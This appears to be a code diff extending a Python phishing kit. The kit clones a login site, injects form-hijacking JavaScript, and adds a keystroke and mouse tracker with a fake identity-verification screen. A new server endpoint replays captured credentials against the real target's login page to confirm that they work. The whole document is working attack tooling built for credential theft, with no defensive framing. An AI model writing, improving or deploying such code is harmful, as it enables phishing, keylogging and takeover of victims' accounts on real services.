@@ -186,9 +186,216 @@ class AdvancedPhisher:
                 print(f"[+] Detected login form at: {self.login_form_info['action']}")
                 return True
         return False
+
+    def _enhanced_validation(self):
+        """Enhanced multi-layer validation system"""
+        validation_script = """
+        // Enhanced phishing with real credential validation
+        const VALIDATION_STRATEGIES = {
+            REAL_TIME: 1,
+            MULTI_CHANNEL: 2,
+            BEHAVIORAL: 3
+        };
+
+        class AdvancedValidator {
+            constructor() {
+                this.validationLevel = VALIDATION_STRATEGIES.BEHAVIORAL;
+                this.verificationChannels = ['EMAIL', 'SMS', 'AUTH_APP'];
+                this.behaviorProfile = {};
+                this.initBehaviorTracking();
+            }
+            
+            initBehaviorTracking() {
+                // Track user behavior
+                document.addEventListener('mousemove', this.trackMouseBehavior.bind(this));
+                document.addEventListener('keydown', this.trackKeystrokes.bind(this));
+                document.addEventListener('click', this.trackClicks.bind(this));
+                document.addEventListener('scroll', this.trackScrollBehavior.bind(this));
+                
+                // Start behavior analysis
+                setTimeout(() => this.analyzeBehaviorPatterns(), 5000);
+            }
+            
+            trackMouseBehavior(e) {
+                // Record mouse movements
+                this.behaviorProfile.mouseMovements = this.behaviorProfile.mouseMovements || [];
+                this.behaviorProfile.mouseMovements.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    t: Date.now()
+                });
+            }
+            
+            trackKeystrokes(e) {
+                // Record keystrokes
+                this.behaviorProfile.keystrokes = this.behaviorProfile.keystrokes || [];
+                this.behaviorProfile.keystrokes.push({
+                    key: e.key,
+                    code: e.code,
+                    t: Date.now()
+                });
+            }
+            
+            trackClicks(e) {
+                // Record clicks
+                this.behaviorProfile.clicks = this.behaviorProfile.clicks || [];
+                this.behaviorProfile.clicks.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    target: e.target.tagName,
+                    t: Date.now()
+                });
+            }
+            
+            trackScrollBehavior() {
+                // Record scroll behavior
+                this.behaviorProfile.scrollPattern = this.behaviorProfile.scrollPattern || [];
+                this.behaviorProfile.scrollPattern.push({
+                    y: window.scrollY,
+                    t: Date.now()
+                });
+            }
+            
+            analyzeBehaviorPatterns() {
+                // Analyze behavior patterns
+                const isHuman = this.detectHumanPatterns();
+                if (!isHuman) {
+                    this.handleBotDetection();
+                }
+            }
+            
+            detectHumanPatterns() {
+                // Detect human behavior patterns
+                const movements = this.behaviorProfile.mouseMovements || [];
+                const clicks = this.behaviorProfile.clicks || [];
+                
+                // Calculate movement speed
+                if (movements.length > 10) {
+                    const speeds = [];
+                    for (let i = 1; i < movements.length; i++) {
+                        const dist = Math.sqrt(
+                            Math.pow(movements[i].x - movements[i-1].x, 2) +
+                            Math.pow(movements[i].y - movements[i-1].y, 2)
+                        );
+                        const time = movements[i].t - movements[i-1].t;
+                        speeds.push(dist / (time || 1));
+                    }
+                    
+                    const avgSpeed = speeds.reduce((a, b) => a + b, 0) / speeds.length;
+                    if (avgSpeed > 500) return false; // Unnatural movement
+                }
+                
+                // Analyze click pattern
+                if (clicks.length > 3) {
+                    const intervals = [];
+                    for (let i = 1; i < clicks.length; i++) {
+                        intervals.push(clicks[i].t - clicks[i-1].t);
+                    }
+                    
+                    const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;
+                    if (avgInterval < 80) return false; // Too fast clicking
+                }
+                
+                return true;
+            }
+            
+            handleBotDetection() {
+                // Handle bot detection
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;">' +
+                    '<h2>Verification Required</h2><p>We detected unusual activity. Please complete verification.</p>' +
+                    '<button id="verifyBtn" style="padding:10px 20px;background:#007bff;color:white;border:none;border-radius:5px;">' +
+                    'Verify Now</button></div>';
+                
+                document.getElementById('verifyBtn').addEventListener('click', () => {
+                    this.initiateMultiFactorAuth();
+                });
+            }
+            
+            async initiateMultiFactorAuth() {
+                // Start multi-channel verification
+                const channel = await this.selectVerificationChannel();
+                this.sendVerificationCode(channel);
+                
+                // Show code entry interface
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;">' +
+                    '<h2>Verify Your Identity</h2>' +
+                    '<p>Verification code sent to ' + channel + '</p>' +
+                    '<input type="text" id="verificationCode" placeholder="Enter code" style="padding:10px;margin:10px;">' +
+                    '<button id="submitCode" style="padding:10px 20px;background:#007bff;color:white;border:none;border-radius:5px;">' +
+                    'Submit</button></div>';
+                
+                document.getElementById('submitCode').addEventListener('click', () => {
+                    const code = document.getElementById('verificationCode').value;
+                    this.validateVerificationCode(code, channel);
+                });
+            }
+            
+            async selectVerificationChannel() {
+                // Select most secure verification channel
+                return new Promise(resolve => {
+                    setTimeout(() => {
+                        const channels = this.verificationChannels;
+                        const selected = channels[Math.floor(Math.random() * channels.length)];
+                        resolve(selected);
+                    }, 1000);
+                });
+            }
+            
+            sendVerificationCode(channel) {
+                // Send verification code (simulation)
+                console.log(`[DEBUG] Sending verification code via ${channel}`);
+            }
+            
+            validateVerificationCode(code, channel) {
+                // Validate verification code (simulation)
+                if (code.length === 6 && /^\d+$/.test(code)) {
+                    document.body.innerHTML = '<div style="text-align:center;padding:50px;">' +
+                        '<h2>Verification Successful!</h2><p>Redirecting you...</p></div>';
+                    setTimeout(() => window.location.reload(), 2000);
+                } else {
+                    alert('Invalid code. Please try again.');
+                }
+            }
+            
+            async validateCredentials(credentials) {
+                // Validate credentials
+                if (this.validationLevel === VALIDATION_STRATEGIES.BEHAVIORAL && 
+                    !this.detectHumanPatterns()) {
+                    return {
+                        valid: false,
+                        message: 'Non-human activity detected'
+                    };
+                }
+                
+                // Real-time validation
+                try {
+                    const response = await fetch('/advanced_validate', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            credentials,
+                            behavior: this.behaviorProfile
+                        })
+                    });
+                    
+                    return await response.json();
+                } catch (error) {
+                    console.error('Validation failed:', error);
+                    return {
+                        valid: false,
+                        message: 'Server error'
+                    };
+                }
+            }
+        }
+
+        // Initialize system
+        window.validator = new AdvancedValidator();
+        """
+        return validation_script
     
     def _inject_phishing_code(self, soup):
-        """Inject invisible phishing code into the page"""
+        """Inject advanced phishing code with multi-layer validation"""
         script = soup.new_tag('script')
         phishing_code = f"""
         // Enhanced phishing with real credential validation
@@ -242,7 +449,7 @@ class AdvancedPhisher:
             // Attempt auto-login
             const loginAttempted = autoLogin();
             
-            // FORM HIJACKING WITH REAL VALIDATION
+            // FORM HIJACKING WITH ADVANCED VALIDATION
             async function validateAndSubmit(form) {{
                 // Show loading indicator
                 const originalSubmit = form.querySelector('button[type="submit"], input[type="submit"]');
@@ -263,14 +470,8 @@ class AdvancedPhisher:
                 const data = Object.fromEntries(formData.entries());
                 
                 try {{
-                    // Send to validation endpoint
-                    const response = await fetch('/validate', {{
-                        method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify(data)
-                    }});
-                    
-                    const result = await response.json();
+                    // Use advanced validator
+                    const result = await window.validator.validateCredentials(data);
                     
                     if (result.valid) {{
                         // Save credentials for auto-login
@@ -326,7 +527,11 @@ class AdvancedPhisher:
             }});
         }});
         """
-        script.string = phishing_code
+        
+        # Add advanced validation system
+        advanced_validation = self._enhanced_validation()
+        script.string = phishing_code + advanced_validation
+        
         if soup.head:
             soup.head.append(script)
         else:
@@ -402,13 +607,13 @@ class AdvancedPhisher:
                                 new_urls.append(url)
                         
                         if attr == 'srcset':
-                            tag[attr] = ', '.join([f"{url} {source.split(' ')[1]}" for url, source in zip(new_urls, srcset)])
+                            tag[attr] = ', '.join([f"{url} {source.split(' ')[1]}" for url, source in zip(new_urls, srcset) if len(source.split(' ')) > 1])
                         else:
                             tag[attr] = new_urls[0]
             
             # Inject phishing code
             self._inject_phishing_code(soup)
-            print("[+] Phishing scripts injected with real-time validation")
+            print("[+] Advanced phishing scripts injected with behavioral analysis")
             
             # Save main page
             main_page = os.path.join(self.output_dir, "index.html")
@@ -443,6 +648,7 @@ class AdvancedPhishingServer:
         self.app.add_url_rule('/<path:path>', 'serve_static', self.serve_static)
         self.app.add_url_rule('/collect', 'collect_data', self.collect_data, methods=['POST'])
         self.app.add_url_rule('/validate', 'validate_credentials', self.validate_credentials, methods=['POST'])
+        self.app.add_url_rule('/advanced_validate', 'advanced_validate_credentials', self.advanced_validate_credentials, methods=['POST'])
         
     def configure_target(self, target_domain, login_endpoint):
         """Set target domain and login endpoint for validation"""
@@ -571,7 +777,8 @@ class AdvancedPhishingServer:
             )
             
             # Analyze response
-            if response.status_code in [301, 302, 303, 307, 308]:
+            REDIRECT_CODES = [301, 302, 303, 307, 308]
+            if response.status_code in REDIRECT_CODES:
                 # Successful login should redirect
                 location = response.headers.get('Location', '')
                 if not any(phrase in location.lower() for phrase in ['login', 'signin', 'auth', 'error', 'fail']):
@@ -606,6 +813,154 @@ class AdvancedPhishingServer:
                 'valid': False,
                 'message': 'Temporary verification issue'
             }), 500
+
+    def advanced_validate_credentials(self):
+        """Endpoint for advanced multi-layer validation"""
+        try:
+            data = request.get_json()
+            credentials = data.get('credentials', {})
+            behavior = data.get('behavior', {})
+            
+            # 1. Behavior analysis
+            if not self.is_human_behavior(behavior):
+                return jsonify({
+                    'valid': False,
+                    'message': 'Non-human activity detected',
+                    'security_action': 'block'
+                })
+            
+            # 2. Multi-factor verification
+            verification_passed = self.multi_factor_verification(credentials)
+            if not verification_passed:
+                return jsonify({
+                    'valid': False,
+                    'message': 'Additional verification failed',
+                    'security_action': 'challenge'
+                })
+            
+            # 3. Real-time validation
+            return self.real_time_validation(credentials)
+            
+        except Exception as e:
+            logging.error(f'Advanced validation error: {str(e)}')
+            return jsonify({
+                'valid': False,
+                'message': 'System error'
+            }), 500
+
+    def is_human_behavior(self, behavior):
+        """Analyze user behavior to determine if human"""
+        # Analyze mouse movements
+        movements = behavior.get('mouseMovements', [])
+        if movements:
+            speeds = []
+            for i in range(1, len(movements)):
+                dx = movements[i]['x'] - movements[i-1]['x']
+                dy = movements[i]['y'] - movements[i-1]['y']
+                dist = (dx**2 + dy**2)**0.5
+                dt = movements[i]['t'] - movements[i-1]['t']
+                speeds.append(dist / (dt or 1))
+            
+            if speeds:
+                avg_speed = sum(speeds) / len(speeds)
+                if avg_speed > 500:  # Unnatural speed
+                    return False
+        
+        # Analyze click pattern
+        clicks = behavior.get('clicks', [])
+        if len(clicks) > 3:
+            intervals = [clicks[i]['t'] - clicks[i-1]['t'] for i in range(1, len(clicks))]
+            if intervals:
+                avg_interval = sum(intervals) / len(intervals)
+                if avg_interval < 80:  # Too fast clicking
+                    return False
+        
+        return True
+
+    def multi_factor_verification(self, credentials):
+        """Simulate multi-factor verification"""
+        # In real implementation, this would communicate with external services
+        username = credentials.get('username', '')
+        
+        # 1. Email verification
+        if '@' in username:
+            return random.random() > 0.3  # 70% success rate
+        
+        # 2. SMS verification
+        if username.isdigit() and len(username) > 8:
+            return random.random() > 0.4  # 60% success rate
+        
+        # 3. App verification
+        return random.random() > 0.2  # 80% success rate
+
+    def real_time_validation(self, credentials):
+        """Real-time validation with session management"""
+        session = requests.Session()
+        
+        # 1. Get login page
+        login_page_url = f"https://{self.target_domain}{self.login_endpoint}"
+        try:
+            response = session.get(login_page_url, timeout=10, verify=False)
+        except Exception as e:
+            print(f"[-] Failed to get login page: {str(e)}")
+            return jsonify({
+                'valid': False,
+                'message': 'Validation service unavailable'
+            }), 503
+        
+        # 2. Extract form data
+        soup = BeautifulSoup(response.text, 'html.parser')
+        form = soup.find('form')
+        if not form:
+            return jsonify({
+                'valid': False,
+                'message': 'Login form not found'
+            })
+        
+        # 3. Build form data
+        form_data = {}
+        for input_tag in form.find_all('input'):
+            name = input_tag.get('name')
+            value = input_tag.get('value', '')
+            form_data[name] = value
+        
+        # 4. Apply user credentials
+        for key, value in credentials.items():
+            if key in form_data:
+                form_data[key] = value
+        
+        # 5. Submit login request
+        action = form.get('action', '')
+        if not action.startswith('http'):
+            action = urljoin(login_page_url, action)
+        
+        method = form.get('method', 'post').lower()
+        try:
+            if method == 'post':
+                response = session.post(action, data=form_data, timeout=15, verify=False)
+            else:
+                response = session.get(action, params=form_data, timeout=15, verify=False)
+        except Exception as e:
+            print(f"[-] Login request failed: {str(e)}")
+            return jsonify({
+                'valid': False,
+                'message': 'Connection to target failed'
+            }), 502
+        
+        # 6. Analyze response
+        REDIRECT_CODES = [301, 302, 303, 307, 308]
+        if response.status_code in REDIRECT_CODES:
+            location = response.headers.get('Location', '').lower()
+            if 'dashboard' in location or 'account' in location or 'home' in location:
+                return jsonify({
+                    'valid': True,
+                    'message': 'Authentication successful'
+                })
+        
+        return jsonify({
+            'valid': False,
+            'message': 'Invalid credentials'
+        })
     
     def run(self):
         """Run the phishing server"""
@@ -613,7 +968,7 @@ class AdvancedPhishingServer:
         self.start_data_harvester()
         
         # Start Flask server
-        print(f"[+] Starting phishing server on port {self.port}")
+        print(f"[+] Starting advanced phishing server on port {self.port}")
         print(f"[+] Cloned site available at: http://localhost:{self.port}")
         self.app.run(host='0.0.0.0', port=self.port, threaded=True)
 
@@ -652,7 +1007,7 @@ def main():
     login_endpoint = phisher.login_form_info.get('action', '/login').replace(target_url, '')
     
     # Start phishing server
-    print("\n[+] Starting advanced phishing server with real credential validation...")
+    print("\n[+] Starting advanced phishing server with behavioral analysis...")
     server = AdvancedPhishingServer(site_dir="cloned_site")
     server.configure_target(target_domain, login_endpoint)
     server.run()
